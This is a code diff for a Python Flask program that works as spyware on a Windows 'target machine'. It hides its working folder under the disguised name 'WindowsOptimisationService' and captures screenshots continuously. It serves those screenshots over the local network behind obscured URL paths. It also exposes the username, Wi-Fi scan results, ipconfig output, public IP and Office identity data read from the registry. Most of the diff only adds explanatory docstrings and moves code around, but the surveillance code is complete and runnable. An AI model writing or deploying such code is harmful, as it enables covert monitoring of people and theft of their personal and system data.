@@ -1,3 +1,4 @@
+""" MODULE LIST """
 import os
 import threading
 import time
@@ -13,17 +14,34 @@ import subprocess
 import requests
 import winreg
 
-# Create Flask app
+
+""" COSTANT: 'app' is a costant with the flask app function form the imported library 'flask' """
 app = Flask(__name__)
 
-# Create directory function
-def make():
+""" 
+FUNCION: makeProgramDir
+Function explanation:
+This function (makeProgramDir), gets the username of the current user that is logged in and store it in the variable 'user_login'
+after storing the data in the 'user_login' variable, it makes another variable ('screen_share_dir') with the path that we want to create.
+At the end of the function it makes the directory with the imported module 'os' and it changes the working program directory from current file path to the directory that we made form the variable 'screen_share_dir'
+"""
+#=^.^=
+def makeProgramDir():
     user_login = os.getlogin()
-    screenShareDir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
-    os.makedirs(screenShareDir, exist_ok=True)
-    os.chdir(screenShareDir)
+    screen_share_dir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
+    os.makedirs(screen_share_dir, exist_ok=True)
+    os.chdir(screen_share_dir)
 
-# Capture images function
+"""
+FUNCTION: capture_images
+Function explanation:
+This function (capture_images), continuously captures screenshots from the primary monitor using the imported 'mss' library.
+It initializes a global list called 'images' to store the captured images.
+Inside a loop, it grabs the current screen image, converts it to a PNG format, and appends the image data to the images list.
+If the list exceeds five images, it removes the oldest one to maintain a fixed size.
+The function also calculates the time taken for each capture and adjusts the sleep duration to achieve a target frame rate of 120 frames per second, ensuring efficient and timely image capturing.
+"""
+#=^.^=
 def capture_images():
     global images
     with mss.mss() as sct:
@@ -40,17 +58,30 @@ def capture_images():
             elapsed = time.time() - start
             time.sleep(max(0, 1/120 - elapsed))
 
-# Get local IP function
+""" COSTANT: 'images' global list variable """
+images = deque(maxlen=5)
+
+"""
+FUNCTION: get_local_ip
+Function explanation:
+This function (get_local_ip), simply use the imported library 'socket' to retrieve the local ip address
+
+Examples of locals ip:
+10.XXX.XXX.XXX  ----\
+172.16.XXX.XXX       | - Where XXX is a number from 0 to 255
+192.168.XXX.XXX ----/
+"""
+#=^.^=
 def get_local_ip():
     return socket.gethostbyname(socket.gethostname())
 
-# Define the global images variable
-images = deque(maxlen=5)
-
+""" COSTANT: 'SERVER_HOST' is a costant with the local ip of the target machine """
 SERVER_HOST = get_local_ip()
+
+""" COSTANT: 'SERVER_PORT' is a costant with a default port assigned from the developer"""
 SERVER_PORT = 31338
 
-# HTML templates
+""" COSTANT: 'login_page' is a costant with the login page html code """
 login_page = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -95,6 +126,7 @@ login_page = f"""<!DOCTYPE html>
 </body>
 </html>"""
 
+""" COSTANT: 'dashboard_page' is a costant with the dashboard page html code """
 dashboard_page = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -155,53 +187,6 @@ dashboard_page = f"""<!DOCTYPE html>
 </body>
 </html>"""
 
-@app.route('/')
-def login():
-    return render_template_string(login_page)
-
-@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
-def dashboard():
-    return render_template_string(dashboard_page)
-
-@app.route('/image.png')
-def image():
-    if images:
-        return Response(images[-1], mimetype='image/png')
-    return "404 Not Found", 404
-
-@app.route('/download.png')
-def download_image():
-    if images:
-        return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
-    return "404 Not Found", 404
-
-@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
-def informations():
-    user_login = os.getlogin()  # Get the current logged-in username
-    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
-    system_info = {
-        "Username": user_login,
-        "Operating System": platform.system(),
-        "OS Version": platform.version(),
-        "Architecture": platform.architecture(),
-        "Processor": platform.processor(),
-        "CPU Cores": psutil.cpu_count(logical=False),
-        "Logical CPUs": psutil.cpu_count(logical=True),
-        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
-        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
-        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
-        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
-        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
-        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
-        "Hostname": socket.gethostname(),  # Get the hostname of the machine
-        "IP Address": get_local_ip(),  # Get the local IP address
-        "Public IP": getPublicIp(),  # Get the public IP address
-        "Local Network Info": getLocalNetworkInfo(),  # Get local network configuration
-        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
-        "Registry User Info": getUserInfoFromRegistry()  # Get user info from the registry
-    }
-    return jsonify(system_info)
-
 def scan_wifi():
     try:
         result = subprocess.check_output(["netsh", "wlan", "show", "all"], encoding='utf-8')
@@ -209,15 +194,12 @@ def scan_wifi():
     except Exception as e:
         return str(e)  # Return the error message if scanning fails
 
-# Static methods for additional functionalities
-@staticmethod
 def getPublicIp():
     try:
         return requests.get('https://api.ipify.org').content.decode('utf8')
     except requests.RequestException as e:
         return f"Error getting public IP: {str(e)}"
 
-@staticmethod
 def getLocalNetworkInfo():
     try:
         result = subprocess.run(["ipconfig", "/all"], capture_output=True, text=True, check=True)
@@ -227,8 +209,6 @@ def getLocalNetworkInfo():
     except Exception as e:
         return f"An error occurred: {str(e)}"
 
-
-@staticmethod
 def getRegistryValue(path, key):
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
@@ -238,11 +218,9 @@ def getRegistryValue(path, key):
     except Exception as e:
         return str(e)
 
-@staticmethod
 def getUserInfoFromRegistry():
     userInfo = {}
-    registryPath = r"SOFTWARE\Microsoft\Office\C2RSvcMgr\MsaDeviceToken"
-    
+    registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
     try:
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
             i = 0
@@ -270,8 +248,61 @@ def getUserInfoFromRegistry():
     
     return userInfo
 
+""" FLASK APP PAGES """
+""" '/' PATH: Login path """
+@app.route('/')
+def login():
+    return render_template_string(login_page)
+
+""" '/4ee1711430410e5f2ec9d8188ac1f134' PATH: Dashboard path """
+@app.route('/4ee1711430410e5f2ec9d8188ac1f134')
+def dashboard():
+    return render_template_string(dashboard_page)
+
+""" '/image.png' PATH: Path used to store images """
+@app.route('/image.png')
+def image():
+    if images:
+        return Response(images[-1], mimetype='image/png')
+    return "404 Not Found", 404
+
+""" '/download.png' PATH: Path used to download the stored images """
+@app.route('/download.png')
+def download_image():
+    if images:
+        return send_file(io.BytesIO(images[-1]), mimetype='image/png', as_attachment=True, download_name='screenshot.png')
+    return "404 Not Found", 404
+
+""" '//16f0ada2144eaa0b96478073d5e3d78b' PATH: Path used to store system informations """
+@app.route('/16f0ada2144eaa0b96478073d5e3d78b')
+def informations():
+    user_login = os.getlogin()  # Get the current logged-in username
+    wifi_list = scan_wifi()  # Get the list of available Wi-Fi networks
+    system_info = {
+        "Username": user_login,
+        "Operating System": platform.system(),
+        "OS Version": platform.version(),
+        "Architecture": platform.architecture(),
+        "Processor": platform.processor(),
+        "CPU Cores": psutil.cpu_count(logical=False),
+        "Logical CPUs": psutil.cpu_count(logical=True),
+        "Memory": f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB",
+        "Used Memory": f"{psutil.virtual_memory().used / (1024 ** 3):.2f} GB",
+        "Free Memory": f"{psutil.virtual_memory().available / (1024 ** 3):.2f} GB",
+        "Disk Usage": f"{psutil.disk_usage('/').total / (1024 ** 3):.2f} GB",
+        "Used Disk": f"{psutil.disk_usage('/').used / (1024 ** 3):.2f} GB",
+        "Free Disk": f"{psutil.disk_usage('/').free / (1024 ** 3):.2f} GB",
+        "Hostname": socket.gethostname(),  # Get the hostname of the machine
+        "IP Address": get_local_ip(),  # Get the local IP address
+        "Public IP": getPublicIp(),  # Get the public IP address
+        "Local Network Info": getLocalNetworkInfo(),  # Get local network configuration
+        "WiFi Networks": wifi_list,  # List of available Wi-Fi networks
+        "Registry User Info": getUserInfoFromRegistry()  # Get user info from the registry
+    }
+    return jsonify(system_info)
+
 if __name__ == "__main__":
-    make()
+    makeProgramDir()
     images = deque(maxlen=5)
     threading.Thread(target=capture_images, daemon=True).start()
-    app.run(host=get_local_ip(), port=SERVER_PORT)
+    app.run(host=SERVER_HOST, port=SERVER_PORT)
